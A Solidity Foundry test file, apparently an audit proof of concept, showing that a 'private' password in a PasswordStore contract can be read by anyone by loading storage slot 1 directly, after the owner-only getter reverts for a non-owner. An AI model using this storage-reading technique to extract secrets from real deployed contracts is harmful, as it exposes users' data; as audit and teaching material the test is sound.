// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/PasswordStore.sol";

contract PasswordStoreTest is Test {
    PasswordStore passwordStore;
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() public {
        vm.prank(owner);
        passwordStore = new PasswordStore();
    }

    // PoC: Proving that private variables on-chain are completely public to anyone
    function test_hacker_can_read_private_password() public {
        string memory expectedPassword = "SuperSecretPassword123";
        
        // 1. Owner sets the password
        vm.prank(owner);
        passwordStore.setPassword(expectedPassword);

        // 2. Hacker tries to call getPassword() -> Reverts because hacker is not owner
        vm.prank(hacker);
        vm.expectRevert();
        passwordStore.getPassword();

        // 3. THE EXPLOIT: Read the private state variable directly from storage slot 1!
        bytes32 storedValue = vm.load(address(passwordStore), bytes32(uint256(1)));
        
        // 4. Extract the actual string bytes (first 22 bytes for "SuperSecretPassword123")
        bytes memory leakedBytes = new bytes(22);
        for (uint256 i = 0; i < 22; i++) {
            leakedBytes[i] = storedValue[i];
        }
        string memory leakedPassword = string(leakedBytes);

        console.log("Leaked Password successfully:", leakedPassword);

        // 5. Assert that the leaked password matches the expected one!
        assertEq(leakedPassword, expectedPassword);
        emit log("Exploit Success: Private password successfully leaked via storage slot reading!");
    }
}